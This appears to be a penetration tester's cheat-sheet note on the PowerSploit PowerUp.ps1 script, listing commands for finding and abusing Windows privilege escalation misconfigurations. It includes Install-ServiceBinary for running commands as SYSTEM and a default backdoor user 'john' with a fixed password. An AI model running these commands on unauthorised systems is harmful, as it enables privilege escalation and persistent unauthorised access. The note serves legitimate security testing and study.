> PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities.
> 
> PowerUp.ps1 aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
> 
> The default AbuseFunction behavior is to create a new local user called `john` with the password `Password123!`
> 
> https://powersploit.readthedocs.io/en/latest/Privesc/


#Windows_Privilege_Escalation 

# Binary Location

Copy to working directory
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```

# Usage

Import `PowerUp.ps1`
```powershell
. .\PowerUp.ps1
```

Runs all the checks included in the module
```powershell
Invoke-AllChecks
```

Displays services the current user can modify, such as the service binary or configuration files
```powershell
Get-ModifiableServiceFile
```

Replaces the service binary for the specified service with one that executes a specified command as SYSTEM
```powershell
Install-ServiceBinary
```

Parses a passed string containing multiple possible file/folder paths and returns the file paths where the current user has modification rights
```powershell
Get-ModifiablePath
```

Returns the name and binary path for services with unquoted paths that also have a space in the name
```powershell
Get-UnquotedService
```